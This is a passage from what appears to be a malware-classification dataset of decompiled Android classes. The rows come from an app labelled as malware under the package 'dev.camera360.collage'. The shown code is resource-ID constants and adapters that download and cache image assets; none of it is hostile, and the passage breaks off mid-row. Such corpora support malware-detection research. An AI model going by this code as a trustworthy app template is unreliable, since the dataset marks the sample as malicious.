color_grey=0x7f0700ce;   public static final int color_grey2=0x7f07010e;   public static final int color_lightblue=0x7f0700c4;   public static final int color_lightblue2=0x7f070106;   public static final int color_lightcream=0x7f0700be;   public static final int color_lightcream2=0x7f070100;   public static final int color_lightskin=0x7f0700bd;   public static final int color_lightskin2=0x7f0700ff;   public static final int color_orange=0x7f0700c1;   public static final int color_orange2=0x7f070103;   public static final int color_picker1=0x7f0700c7;   public static final int color_picker2=0x7f0700d2;   public static final int color_picker_border=0x7f07014e;   public static final int color_pink=0x7f0700cc;   public static final int color_pink2=0x7f07010c;   public static final int color_purple=0x7f0700cb;   public static final int color_purple2=0x7f07010b;   public static final int color_red=0x7f0700c0;   public static final int color_red2=0x7f070102;   public static final int color_seeks=0x7f070159;   public static final int color_silver=0x7f0700c5;   public static final int color_silver2=0x7f070107;   public static final int color_white=0x7f0700cd;   public static final int color_white2=0x7f07010d;   public static final int color_yellow=0x7f0700c2;   public static final int color_yellow2=0x7f070104;   public static final int colors_layout=0x7f0700bc;   public static final int container=0x7f070072;   public static final int contrast_seek=0x7f070158;   public static final int crop_btn=0x7f07017f;   public static final int curve_btn=0x7f070144;   public static final int delete_button=0x7f070092;   public static final int delete_layout=0x7f0701c4;   public static final int description_text=0x7f070019;   public static final int detail=0x7f070091;   public static final int domain_prompt=0x7f07005d;   public static final int draw_btn=0x7f0700f2;   public static final int draw_layout=0x7f070114;   public static final int drawing=0x7f0700f9;   public static final int drawingFrame=0x7f0700d6;   public static final int drawing_button=0x7f0700d3;   public static final int edit_layout=0x7f0701c1;   public static final int editor_button=0x7f07006e;   public static final int edittext=0x7f07009a;   public static final int effect_black=0x7f07015f;   public static final int effect_boost_1=0x7f070160;   public static final int effect_boost_2=0x7f070161;   public static final int effect_boost_3=0x7f070162;   public static final int effect_brightness=0x7f070163;   public static final int effect_btn=0x7f07013d;   public static final int effect_color_blue=0x7f070164;   public static final int effect_color_depth_32=0x7f070167;   public static final int effect_color_depth_64=0x7f070168;   public static final int effect_color_green=0x7f070165;   public static final int effect_color_red=0x7f070166;   public static final int effect_contrast=0x7f070169;   public static final int effect_emboss=0x7f07016a;   public static final int effect_engrave=0x7f07016b;   public static final int effect_flea=0x7f07016c;   public static final int effect_gamma=0x7f07016d;   public static final int effect_gaussian_blue=0x7f07016e;   public static final int effect_grayscale=0x7f07016f;   public static final int effect_hue=0x7f070170;   public static final int effect_invert=0x7f070171;   public static final int effect_layout=0x7f070150;   public static final int effect_mean_remove=0x7f070172;   public static final int effect_name=0x7f070151;   public static final int effect_none=0x7f07015e;   public static final int effect_reflection=0x7f070173;   public static final int effect_round_corner=0x7f070174;   public static final int effect_saturation=0x7f070175;   public static final int effect_seek=0x7f070155;   public static final int effect_sepia=0x7f070176;   public static final int effect_sepia_blue=0x7f070177;   public static final int effect_sepia_green=0x7f070178;   public static final int effect_sheding_cyan=0x7f070179;   public static final int effect_sheding_green=0x7f07017a;   public static final int effect_sheding_yellow=0x7f07017b;   public static final int effect_smooth=0x7f07017c;   public static final int effect_tint=0x7f07017d;   public static final int effect_watermark=0x7f07017e;   public static final int emotion_btn=0x7f0700e8;   public static final int emotion_layout=0x7f0700e7;   public static final int erase_btn=0x7f070122;   public static final int erase_layout=0x7f070121;   public static final int eraseall_btn=0x7f070123;   public static final int exit_btn=0x7f07012c;   public static final int exit_button=0x7f0701b1;   public static final int exit_layout=0x7f07012a;   public static final int expanded_image=0x7f070073;   public static final int file_type_prompt=0x7f07005a;   public static final int flickr_btn=0x7f0700dc;   public static final int frame_btn=0x7f07013b;   public static final int frame_button=0x7f070085;   public static final int frame_layout=0x7f070084;   public static final int frame_text=0x7f07013a;   public static final int frameopacity_btn=0x7f070142;   public static final int frameopacity_layout=0x7f070146;   public static final int frameopacity_seek=0x7f070147;   public static final int gadget_btn=0x7f0700ec;   public static final int gadget_gallery=0x7f070139;   public static final int gadget_layout=0x7f07003a;   public static final int gallery1=0x7f07003b;   public static final int gallery2=0x7f07003e;   public static final int gallery3=0x7f07003f;   public static final int gallery4=0x7f070040;   public static final int gallery5=0x7f070041;   public static final int gallery6=0x7f0700e2;   public static final int gallery_button=0x7f07007d;   public static final int gallery_layout=0x7f07007c;   public static final int gif1=0x7f070055;   public static final int gift_btn=0x7f070118;   public static final int go_to_clear_button=0x7f07005e;   public static final int go_to_dismiss_button=0x7f07005f;   public static final int go_to_go_button=0x7f070060;   public static final int go_to_url_field=0x7f070058;   public static final int googleimage_btn=0x7f07011a;   public static final int green_seek=0x7f07015b;   public static final int greeting_layout=0x7f070137;   public static final int grid=0x7f070009;   public static final int gridview=0x7f070039;   public static final int hdwallpaper_layout=0x7f0701b7;   public static final int head_layout=0x7f070078;   public static final int help_btn=0x7f07012b;   public static final int help_button=0x7f070087;   public static final int help_layout=0x7f070086;   public static final int hide_keyboard_btn=0x7f07009c;   public static final int history_btn=0x7f0700ee;   public static final int horizontalScrollView=0x7f07015d;   public static final int howto1_button=0x7f070020;   public static final int howto1_text=0x7f07001f;   public static final int howto2_button=0x7f07001e;   public static final int howto2_text=0x7f07001d;   public static final int howto3_button=0x7f070022;   public static final int howto3_text=0x7f070021;   public static final int howto4_button=0x7f070024;   public static final int howto4_text=0x7f070023;   public static final int howto5_button=0x7f070026;   public static final int howto5_text=0x7f070025;   public static final int howto_button=0x7f070081;   public static final int icon=0x7f070063;   public static final int imAdview=0x7f07008e;   public static final int imageBgnd=0x7f0700d7;   public static final int imageCanvas=0x7f07013e;   public static final int imageFrame=0x7f07003d;   public static final int imageSwitcher1=0x7f070053;   public static final int imageView=0x7f0700d8;   public static final int image_preview=0x7f0700fe;   public static final int image_search=0x7f070030;   public static final int image_view=0x7f070056;   public static final int img=0x7f07000a;   public static final int img_cartoon=0x7f070097;   public static final int instruction_layout=0x7f070049;   public static final int instruction_text=0x7f07004a;   public static final int intercept_layout=0x7f070088;   public static final int italic_button=0x7f0700b6;   public static final int keyword_type_prompt=0x7f07005b;   public static final int large_brush=0x7f070015;   public static final int large_erase=0x7f07002e;   public static final int large_pattern=0x7f070188;   public static final int large_point=0x7f070135;   public static final int largest_point=0x7f070136;   public static final int later_button=0x7f0701af;   public static final int layout=0x7f070042;   public static final int layout_bookmark=0x7f07002f;   public static final int left_button=0x7f070052;   public static final int line_btn=0x7f070115;   public static final int linegallery_btn=0x7f070116;   public static final int mainLayout=0x7f070045;   public static final int maxmode=0x7f070035;   public static final int medium_brush=0x7f070014;   public static final int medium_erase=0x7f07002d;   public static final int medium_pattern=0x7f070187;   public static final int medium_point=0x7f070134;   public static final int message_btn=0x7f07012e;   public static final int message_layout=0x7f07012d;   public static final int min_quake_mag_prompt=0x7f07018c;   public static final int modedatedesc=0x7f070033;   public static final int modehorizontal=0x7f070182;   public static final int modeinteresting=0x7f070034;   public static final int modemax100=0x7f070037;   public static final int modemax50=0x7f070036;   public static final int moderelevant=0x7f070032;   public static final int modevertical=0x7f070181;   public static final int momentcam_btn=0x7f0700e6;   public static final int momentcam_button=0x7f07007b;   public static final int momentcam_layout=0x7f07007a;   public static final int momentcamalbum_button=0x7f070067;   public static final int momentcamalbum_layout=0x7f070066;   public static final int momentcamgallery_button=0x7f07006a;   public static final int momentcamgallery_layout=0x7f070068;   public static final int momentcamplay_button=0x7f07004b;   public static final int more_layout=0x7f0701b9;   public static final int moreprogram_button=0x7f070083;   public static final int moreprogram_layout=0x7f070082;   public static final int morewallpaper_button=0x7f0700e3;   public static final int mygallery_btn=0x7f0700ea;   public static final int new_btn=0x7f070127;   public static final int new_image=0x7f07006d;   public static final int new_image_layout=0x7f07006c;   public static final int new_layout=0x7f070126;   public static final int next_button=0x7f070061;   public static final int next_page_button=0x7f07004f;   public static final int no_button=0x7f0701b0;   public static final int noapply_button=0x7f070154;   public static final int noapply_button2=0x7f07014c;   public static final int nobubble_gallery=0x7f0700fd;   public static final int nobubble_layout=0x7f0700fc;   public static final int noframe_btn=0x7f07013c;   public static final int nomessage_btn=0x7f07012f;   public static final int notification_picture=0x7f070029;   public static final int notification_subtitle=0x7f07002b;   public static final int notification_title=0x7f07002a;   public static final int notificationbg=0x7f070028;   public static final int okButton=0x7f07019c;   public static final int opacity_btn=0x7f0700f3;   public static final int opacity_layout=0x7f070148;   public static final int opacity_seek=0x7f0700d4;   public static final int open_button=0x7f070051;   public static final int opq_ok=0x7f070185;   public static final int opq_txt=0x7f070184;   public static final int orientationmode=0x7f070180;   public static final int page10_text=0x7f0701a9;   public static final int page11_text=0x7f0701aa;   public static final int page12_text=0x7f0701ab;   public static final int page13_text=0x7f0701ac;   public static final int page1_text=0x7f0701a0;   public static final int page2_text=0x7f0701a1;   public static final int page3_text=0x7f0701a2;   public static final int page4_text=0x7f0701a3;   public static final int page5_text=0x7f0701a4;   public static final int page6_text=0x7f0701a5;   public static final int page7_text=0x7f0701a6;   public static final int page8_text=0x7f0701a7;   public static final int page9_text=0x7f0701a8;   public static final int page_gallery=0x7f07004e;   public static final int page_layout=0x7f07004c;   public static final int paint_btn=0x7f070065;   public static final int paint_button=0x7f070094;   public static final int paint_layout=0x7f0701c2;   public static final int parent_layout2=0x7f0700f8;   public static final int pattern_btn=0x7f0700f0;   public static final int pattern_gallery=0x7f070113;   public static final int pattern_layout=0x7f070112;   public static final int photoframe_layout=0x7f0701b8;   public static final int pickgallery_btn=0x7f0700eb;   public static final int pixabay_btn=0x7f0700db;   public static final int play_button=0x7f070095;   public static final int progressBar1=0x7f070076;   public static final int progress_layout=0x7f070062;   public static final int prompt_input_field=0x7f070075;   public static final int prompt_message_text=0x7f070074;   public static final int quote_btn=0x7f070119;   public static final int quote_btn2=0x7f07011c;   public static final int radiomode=0x7f070031;   public static final int rate_layout=0x7f0701b6;   public static final int recent_update_prompt=0x7f07005c;   public static final int record_btn=0x7f0701ba;   public static final int red_seek=0x7f07015a;   public static final int refresh_btn=0x7f070071;   public static final int relative_checkbox=0x7f070189;   public static final int relative_ssid1=0x7f070191;   public static final int relative_ssid2=0x7f070195;   public static final int relative_ssid3=0x7f070199;   public static final int reload_btn=0x7f070048;   public static final int reload_button=0x7f07007e;   public static final int reload_layout=0x7f07019e;   public static final int reload_text=0x7f07019f;   public static final int reloaddate=0x7f0701ad;   public static final int remove_button=0x7f070138;   public static final int resize_btn=0x7f070128;   public static final int right_button=0x7f070054;   public static final int save_btn=0x7f07011f;   public static final int save_button=0x7f07001b;   public static final int save_item_page_button=0x7f0701b5;   public static final int save_layout=0x7f0700d5;   public static final int scroll_layout=0x7f0701b3;   public static final int search_button=0x7f070008;   public static final int search_field=0x7f0701b2;   public static final int search_prompt=0x7f070077;   public static final int search_text=0x7f070006;   public static final int search_type_prompt=0x7f070059;   public static final int secondBottomBanner=0x7f07008b;   public static final int setting_button=0x7f07006b;   public static final int share_btn=0x7f070057;   public static final int share_button=0x7f070044;   public static final int share_layout=0x7f07011e;   public static final int showopacity_btn=0x7f070124;   public static final int size_seek=0x7f0700b2;   public static final int small_brush=0x7f070013;   public static final int small_erase=0x7f07002c;   public static final int small_pattern=0x7f070186;   public static final int small_point=0x7f070133;   public static final int smallest_point=0x7f070132;   public static final int speech_gallery=0x7f0700b7;   public static final int spinner_item_page=0x7f0701b4;   public static final int spinner_min_level=0x7f07018d;   public static final int spinner_update_freq=0x7f07018f;   public static final int ssid_filter1=0x7f070192;   public static final int ssid_filter1_prompt=0x7f070190;   public static final int ssid_filter2=0x7f070196;   public static final int ssid_filter2_prompt=0x7f070194;   public static final int ssid_filter3=0x7f07019a;   public static final int ssid_filter3_prompt=0x7f070198;   public static final int startAppBanner=0x7f070018;   public static final int switch_button=0x7f070080;   public static final int tapcontext_application_icon_image_view=0x7f0701c0;   public static final int tapcontext_background_view=0x7f0701bb;   public static final int tapcontext_content_text_view=0x7f0701bf;   public static final int tapcontext_extra_content_text_view=0x7f0701be;   public static final int tapcontext_icon_image_view=0x7f0701bc;   public static final int tapcontext_title_text_view=0x7f0701bd;   public static final int text=0x7f0701c5;   public static final int text1=0x7f070043;   public static final int text_btn=0x7f0700ed;   public static final int text_display=0x7f0700bb;   public static final int text_layout=0x7f070099;   public static final int textstyle1=0x7f0700a4;   public static final int textstyle10=0x7f0700ad;   public static final int textstyle11=0x7f0700ae;   public static final int textstyle12=0x7f0700af;   public static final int textstyle13=0x7f0700b0;   public static final int textstyle14=0x7f0700b1;   public static final int textstyle2=0x7f0700a5;   public static final int textstyle3=0x7f0700a6;   public static final int textstyle4=0x7f0700a7;   public static final int textstyle5=0x7f0700a8;   public static final int textstyle6=0x7f0700a9;   public static final int textstyle7=0x7f0700aa;   public static final int textstyle8=0x7f0700ab;   public static final int textstyle9=0x7f0700ac;   public static final int textstyle_chinesetakeaway=0x7f0700a0;   public static final int textstyle_go3v2=0x7f0700a1;   public static final int textstyle_kato=0x7f0700a2;   public static final int textstyle_manga=0x7f0700a3;   public static final int textstyle_mponderosa=0x7f07009e;   public static final int textstyle_rosewood=0x7f07009d;   public static final int textstyle_shanghai=0x7f07009f;   public static final int title=0x7f070090;   public static final int top_erase_btn=0x7f0700f1;   public static final int top_exit_btn=0x7f0700f7;   public static final int top_layout=0x7f070096;   public static final int top_message_btn=0x7f0700f5;   public static final int top_message_layout=0x7f0700f4;   public static final int top_new_btn=0x7f0700e5;   public static final int top_new_layout=0x7f0700e4;   public static final int top_share_btn=0x7f0700f6;   public static final int update_freq_prompt=0x7f07018e;   public static final int vfTopBanner=0x7f07008a;   public static final int view_button=0x7f07007f;   public static final int wallpaper_button=0x7f0701c3;   public static final int xappad_bannerview=0x7f0701c8;   public static final int xappad_bannerviewimg=0x7f0701c9;   public static final int xappad_bannerviewtext=0x7f0701ca;   public static final int xappad_customtextview=0x7f0701cb;   public static final int xappad_customtextviewcta=0x7f0701cd;   public static final int xappad_customtextviewdescription=0x7f0701ce;   public static final int xappad_customtextviewsmalltext=0x7f0701cf;   public static final int xappad_customtextviewtitle=0x7f0701cc;   public static final int xappad_mainview=0x7f0701c7;   public static final int xspacing_seek=0x7f0700b8;   public static final int yborder_seek=0x7f0700b9;   public static final int yes_button=0x7f0701ae;   public static final int yspacing_seek=0x7f0700b4;   public static final int zoom_btn=0x7f070064;   public static final int zoom_button=0x7f070093; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\integer.code","public static final class integer {   public static final int large_size=0x7f0a0003;   public static final int largest_size=0x7f0a0004;   public static final int medium_size=0x7f0a0002;   public static final int small_size=0x7f0a0001;   public static final int smallest_size=0x7f0a0000; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\j.code","public class j extends ArrayAdapter<String> {   static int e;   static int f;   public String a;   boolean b;   boolean c;   int d;   int g;   private o[] h;   private Context i;   private a j;   private int k;   private LayoutInflater l;   private void a(  Context context){     Display defaultDisplay=((WindowManager)context.getSystemService(""window"")).getDefaultDisplay();     e=defaultDisplay.getWidth();     f=defaultDisplay.getHeight();   }   public j(  Context context,  int i,  ArrayList arrayList){     super(context,i,arrayList);     this.a=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"" + BaseActivity.PARENT_FOLDER2+ ""/asset/frame/"";     this.b=false;     this.c=false;     this.d=1;     this.i=context;     this.g=i;     TypedArray obtainStyledAttributes=context.obtainStyledAttributes(R.styleable.Gallery1);     this.k=obtainStyledAttributes.getResourceId(0,0);     obtainStyledAttributes.recycle();     this.l=(LayoutInflater)context.getSystemService(""layout_inflater"");     a(context);     this.j=new a(this,null);     this.h=new o[arrayList.toArray().length];     int length=arrayList.toArray().length;     for (int i2=0; i2 < length; i2++) {       this.h[i2]=new o();       this.h[i2].c=arrayList.get(i2).toString();     }     this.j.execute(this.h);   }   @Override public int getCount(){     try {       return this.h.length;     }  catch (    Exception e2) {       return 0;     }   }   @Override public String getItem(  int i){     return this.h[i].c;   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     o oVar=this.h[i];     if (view == null) {       view=this.l.inflate(this.g,(ViewGroup)null);       view.setTag(new b(view));     }     b bVar=(b)view.getTag();     ImageView a2=bVar.a();     ProgressBar b2=bVar.b();     if (oVar.e == null) {       b2.setVisibility(0);       a2.setVisibility(4);       view.setBackgroundDrawable(null);     }  else {       b2.setVisibility(8);       a2.setVisibility(0);       a2.setImageBitmap(oVar.e);       a2.setScaleType(ImageView.ScaleType.FIT_XY);       view.setBackgroundResource(this.k);       a2.setTag(oVar.d);     }     return view;   }   public void a(){     notifyDataSetChanged();   }   public Bitmap a(  String str){     try {       String a2=BaseActivity.a(str,""png"");       if (!str.startsWith(""http"")) {         Bitmap decodeResource=BitmapFactory.decodeResource(this.i.getResources(),this.i.getResources().getIdentifier(str,""drawable"",""dev.camera360.collage""));         File file=new File(this.a,a2);         if (!file.exists()) {           FileOutputStream fileOutputStream=new FileOutputStream(file);           decodeResource.compress(Bitmap.CompressFormat.PNG,100,fileOutputStream);           fileOutputStream.flush();           fileOutputStream.close();           return decodeResource;         }         return decodeResource;       }       File file2=new File(String.valueOf(this.a) + a2);       if (file2.exists()) {         BitmapFactory.Options options=new BitmapFactory.Options();         options.inSampleSize=5;         options.inDither=false;         options.inPurgeable=true;         options.inInputShareable=true;         options.inTempStorage=new byte[16384];         return BitmapFactory.decodeFile(file2.toString(),options);       }       if (!b()) {         return null;       }       BitmapFactory.Options options2=new BitmapFactory.Options();       options2.inSampleSize=1;       options2.inDither=false;       options2.inPurgeable=true;       options2.inInputShareable=true;       options2.inTempStorage=new byte[16384];       URLConnection openConnection=new URL(str).openConnection();       openConnection.connect();       BufferedInputStream bufferedInputStream=new BufferedInputStream(openConnection.getInputStream());       Bitmap decodeStream=BitmapFactory.decodeStream(bufferedInputStream,null,options2);       bufferedInputStream.close();       if (decodeStream == null) {         return null;       }       try {         FileOutputStream fileOutputStream2=new FileOutputStream(file2);         decodeStream.compress(Bitmap.CompressFormat.PNG,100,fileOutputStream2);         fileOutputStream2.flush();         fileOutputStream2.close();       }  catch (      FileNotFoundException e2) {       } catch (      IOException e3) {       }       decodeStream.recycle();       BitmapFactory.Options options3=new BitmapFactory.Options();       options3.inSampleSize=5;       options3.inDither=false;       options3.inPurgeable=true;       options3.inInputShareable=true;       options3.inTempStorage=new byte[16384];       return BitmapFactory.decodeFile(file2.toString(),options2);     }  catch (    Exception e4) {       return null;     }   }   private boolean b(){     this.b=false;     this.c=false;     try {       for (      NetworkInfo networkInfo : ((ConnectivityManager)this.i.getSystemService(""connectivity"")).getAllNetworkInfo()) {         if (networkInfo.getTypeName().equalsIgnoreCase(""WIFI"") && networkInfo.isConnected()) {           this.b=true;         }         if (networkInfo.getTypeName().equalsIgnoreCase(""MOBILE"") && networkInfo.isConnected()) {           this.c=true;         }       }     }  catch (    Exception e2) {     }     return this.b || this.c;   } private static class b {     private View a;     private ImageView b=null;     private ProgressBar c=null;     public b(    View view){       this.a=view;     }     public ImageView a(){       if (this.b == null) {         this.b=(ImageView)this.a.findViewById(R.id.image_view);       }       return this.b;     }     public ProgressBar b(){       if (this.c == null) {         this.c=(ProgressBar)this.a.findViewById(R.id.progressBar1);       }       return this.c;     }   } private class a extends AsyncTask<o,Void,Void> {     private a(){     }     a(    j jVar,    a aVar){       this();     }     @Override public Void doInBackground(    o... oVarArr){       for (      o oVar : oVarArr) {         if (isCancelled()) {           break;         }         oVar.e=j.this.a(oVar.c);         oVar.d=BaseActivity.a(oVar.c,""png"");         publishProgress(new Void[0]);       }       return null;     }     @Override public void onProgressUpdate(    Void... voidArr){       j.this.a();     }     @Override public void onPostExecute(    Void r2){       ((TabSample)((Activity)j.this.i).getParent()).g();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\k.code","public class k extends ArrayAdapter<String> {   static int e;   static int f;   public String a;   boolean b;   boolean c;   int d;   int g;   private o[] h;   private Context i;   private a j;   private int k;   private LayoutInflater l;   private void a(  Context context){     Display defaultDisplay=((WindowManager)context.getSystemService(""window"")).getDefaultDisplay();     e=defaultDisplay.getWidth();     f=defaultDisplay.getHeight();   }   public k(  Context context,  int i,  ArrayList arrayList){     super(context,i,arrayList);     this.a=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"" + BaseActivity.PARENT_FOLDER2+ ""/asset/gadget/"";     this.b=false;     this.c=false;     this.d=1;     this.i=context;     this.g=i;     TypedArray obtainStyledAttributes=context.obtainStyledAttributes(R.styleable.Gallery1);     this.k=obtainStyledAttributes.getResourceId(0,0);     obtainStyledAttributes.recycle();     this.l=(LayoutInflater)context.getSystemService(""layout_inflater"");     a(context);     this.j=new a(this,null);     this.h=new o[arrayList.toArray().length];     int length=arrayList.toArray().length;     for (int i2=0; i2 < length; i2++) {       this.h[i2]=new o();       this.h[i2].c=arrayList.get(i2).toString();     }     this.j.execute(this.h);   }   @Override public int getCount(){     try {       return this.h.length;     }  catch (    Exception e2) {       return 0;     }   }   @Override public String getItem(  int i){     return this.h[i].c;   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     o oVar=this.h[i];     if (view == null) {       view=this.l.inflate(this.g,(ViewGroup)null);       view.setTag(new b(view));     }     b bVar=(b)view.getTag();     ImageView a2=bVar.a();     ProgressBar b2=bVar.b();     if (oVar.e == null) {       b2.setVisibility(0);       a2.setVisibility(4);       view.setBackgroundDrawable(null);     }  else {       b2.setVisibility(8);       a2.setVisibility(0);       a2.setImageBitmap(oVar.e);       a2.setScaleType(ImageView.ScaleType.FIT_XY);       view.setBackgroundResource(this.k);       a2.setTag(oVar.d);     }     return view;   }   public void a(){     notifyDataSetChanged();   }   public Bitmap a(  String str){     try {       String a2=BaseActivity.a(str,""png"");       if (!str.startsWith(""http"")) {         Bitmap decodeResource=BitmapFactory.decodeResource(this.i.getResources(),this.i.getResources().getIdentifier(str,""drawable"",""dev.camera360.collage""));         File file=new File(this.a,a2);         if (!file.exists()) {           FileOutputStream fileOutputStream=new FileOutputStream(file);           decodeResource.compress(Bitmap.CompressFormat.PNG,100,fileOutputStream);           fileOutputStream.flush();           fileOutputStream.close();           return decodeResource;         }         return decodeResource;       }       File file2=new File(String.valueOf(this.a) + a2);       if (file2.exists()) {         BitmapFactory.Options options=new BitmapFactory.Options();         options.inSampleSize=3;         options.inDither=false;         options.inPurgeable=true;         options.inInputShareable=true;         options.inTempStorage=new byte[16384];         return BitmapFactory.decodeFile(file2.toString(),options);       }       if (!b()) {         return null;       }       BitmapFactory.Options options2=new BitmapFactory.Options();       options2.inSampleSize=1;       options2.inDither=false;       options2.inPurgeable=true;       options2.inInputShareable=true;       options2.inTempStorage=new byte[16384];       URLConnection openConnection=new URL(str).openConnection();       openConnection.connect();       BufferedInputStream bufferedInputStream=new BufferedInputStream(openConnection.getInputStream());       Bitmap decodeStream=BitmapFactory.decodeStream(bufferedInputStream,null,options2);       bufferedInputStream.close();       if (decodeStream == null) {         return null;       }       try {         FileOutputStream fileOutputStream2=new FileOutputStream(file2);         decodeStream.compress(Bitmap.CompressFormat.PNG,100,fileOutputStream2);         fileOutputStream2.flush();         fileOutputStream2.close();       }  catch (      FileNotFoundException e2) {       } catch (      IOException e3) {       }       decodeStream.recycle();       BitmapFactory.Options options3=new BitmapFactory.Options();       options3.inSampleSize=3;       options3.inDither=false;       options3.inPurgeable=true;       options3.inInputShareable=true;       options3.inTempStorage=new byte[16384];       return BitmapFactory.decodeFile(file2.toString(),options2);     }  catch (    Exception e4) {       return null;     }   }   private boolean b(){     this.b=false;     this.c=false;     try {       for (      NetworkInfo networkInfo : ((ConnectivityManager)this.i.getSystemService(""connectivity"")).getAllNetworkInfo()) {         if (networkInfo.getTypeName().equalsIgnoreCase(""WIFI"") && networkInfo.isConnected()) {           this.b=true;         }         if (networkInfo.getTypeName().equalsIgnoreCase(""MOBILE"") && networkInfo.isConnected()) {           this.c=true;         }       }     }  catch (    Exception e2) {     }     return this.b || this.c;   } private static class b {     private View a;     private ImageView b=null;     private ProgressBar c=null;     public b(    View view){       this.a=view;     }     public ImageView a(){       if (this.b == null) {         this.b=(ImageView)this.a.findViewById(R.id.image_view);       }       return this.b;     }     public ProgressBar b(){       if (this.c == null) {         this.c=(ProgressBar)this.a.findViewById(R.id.progressBar1);       }       return this.c;     }   } private class a extends AsyncTask<o,Void,Void> {     private a(){     }     a(    k kVar,    a aVar){       this();     }     @Override public Void doInBackground(    o... oVarArr){       for (      o oVar : oVarArr) {         if (isCancelled()) {           break;         }         oVar.e=k.this.a(oVar.c);         oVar.d=BaseActivity.a(oVar.c,""png"");         publishProgress(new Void[0]);       }       return null;     }     @Override public void onProgressUpdate(    Void... voidArr){       k.this.a();     }     @Override public void onPostExecute(    Void r2){       ((TabSample)((Activity)k.this.i).getParent()).g();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\l.code","public class l extends ArrayAdapter<String> {   static int e;   static int f;   public String a;   boolean b;   boolean c;   int d;   int g;   private o[] h;   private Context i;   private a j;   private LayoutInflater k;   private void a(  Context context){     Display defaultDisplay=((WindowManager)context.getSystemService(""window"")).getDefaultDisplay();     e=defaultDisplay.getWidth();     f=defaultDisplay.getHeight();   }   public l(  Context context,  int i,  ArrayList arrayList){     super(context,i,arrayList);     this.a=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"" + BaseActivity.PARENT_FOLDER2+ ""/asset/gadget/"";     this.b=false;     this.c=false;     this.d=1;     this.i=context;     this.g=i;     this.k=(LayoutInflater)context.getSystemService(""layout_inflater"");     a(context);     this.j=new a(this,null);     this.h=new o[arrayList.toArray().length];     int length=arrayList.toArray().length;     for (int i2=0; i2 < length; i2++) {       this.h[i2]=new o();       this.h[i2].e=((MyImageView)arrayList.get(i2)).getImageBitmap();     }     this.j.execute(this.h);   }   @Override public int getCount(){     try {       return this.h.length;     }  catch (    Exception e2) {       return 0;     }   }   @Override public String getItem(  int i){     return this.h[i].c;   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     o oVar=this.h[i];     if (view == null) {       view=this.k.inflate(this.g,(ViewGroup)null);       view.setTag(new b(view));     }     b bVar=(b)view.getTag();     ImageView a2=bVar.a();     ProgressBar b2=bVar.b();     if (oVar.e == null) {       b2.setVisibility(0);       a2.setVisibility(4);       a2.setImageBitmap(null);       a2.setScaleType(ImageView.ScaleType.FIT_XY);       a2.setBackgroundColor(-1);     }  else {       b2.setVisibility(8);       a2.setVisibility(0);       a2.setImageBitmap(oVar.e);       a2.setScaleType(ImageView.ScaleType.FIT_XY);       a2.setBackgroundColor(-1);     }     return view;   }   public void a(){     notifyDataSetChanged();   } private static class b {     private View a;     private ImageView b=null;     private ProgressBar c=null;     public b(    View view){       this.a=view;     }     public ImageView a(){       if (this.b == null) {         this.b=(ImageView)this.a.findViewById(R.id.image_view);       }       return this.b;     }     public ProgressBar b(){       if (this.c == null) {         this.c=(ProgressBar)this.a.findViewById(R.id.progressBar1);       }       return this.c;     }   } private class a extends AsyncTask<o,Void,Void> {     private a(){     }     a(    l lVar,    a aVar){       this();     }     @Override public Void doInBackground(    o... oVarArr){       for (      o oVar : oVarArr) {         if (isCancelled()) {           break;         }         publishProgress(new Void[0]);       }       return null;     }     @Override public void onProgressUpdate(    Void... voidArr){       l.this.a();     }     @Override public void onPostExecute(    Void r1){     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\layout.code","public static final class layout {   public static final int bookmark_grid_dialog=0x7f030000;   public static final int bookmark_item=0x7f030001;   public static final int brush_chooser=0x7f030002;   public static final int christmas_dialog=0x7f030003;   public static final int comment_dialog=0x7f030004;   public static final int confirm_dialog3=0x7f030005;   public static final int custom_bar_notification=0x7f030006;   public static final int erase_chooser=0x7f030007;   public static final int flickr_dialog=0x7f030008;   public static final int gadget_dialog=0x7f030009;   public static final int gadget_dialog2=0x7f03000a;   public static final int gallery_dialog2=0x7f03000b;   public static final int gallery_layout=0x7f03000c;   public static final int gallery_layout2=0x7f03000d;   public static final int gallery_layout3=0x7f03000e;   public static final int gallery_layout4=0x7f03000f;   public static final int gif_view_dialog=0x7f030010;   public static final int gift_dialog=0x7f030011;   public static final int giftdownload_dialog=0x7f030012;   public static final int go_to_dialog=0x7f030013;   public static final int google_image_dialog=0x7f030014;   public static final int grid=0x7f030015;   public static final int grid_item=0x7f030016;   public static final int grid_item2=0x7f030017;   public static final int history_item=0x7f030018;   public static final int home=0x7f030019;   public static final int icon_list_dialog=0x7f03001a;   public static final int item=0x7f03001b;   public static final int javascript_prompt_dialog=0x7f03001c;   public static final int line_dialog=0x7f03001d;   public static final int line_list_dialog=0x7f03001e;   public static final int loading_layout=0x7f03001f;   public static final int main=0x7f030020;   public static final int menu_item=0x7f030021;   public static final int menu_item_gadget=0x7f030022;   public static final int menu_item_icon=0x7f030023;   public static final int menu_item_white2=0x7f030024;   public static final int menu_item_white3=0x7f030025;   public static final int menu_item_white4=0x7f030026;   public static final int menu_item_white5=0x7f030027;   public static final int menu_item_white6=0x7f030028;   public static final int menu_item_white_bgnd=0x7f030029;   public static final int menu_item_wood=0x7f03002a;   public static final int momentcam_dialog=0x7f03002b;   public static final int multiline_text_dialog=0x7f03002c;   public static final int new_add_dialog=0x7f03002d;   public static final int new_background_resize_dialog=0x7f03002e;   public static final int new_background_touch_dialog=0x7f03002f;   public static final int new_camera360_list_dialog=0x7f030030;   public static final int 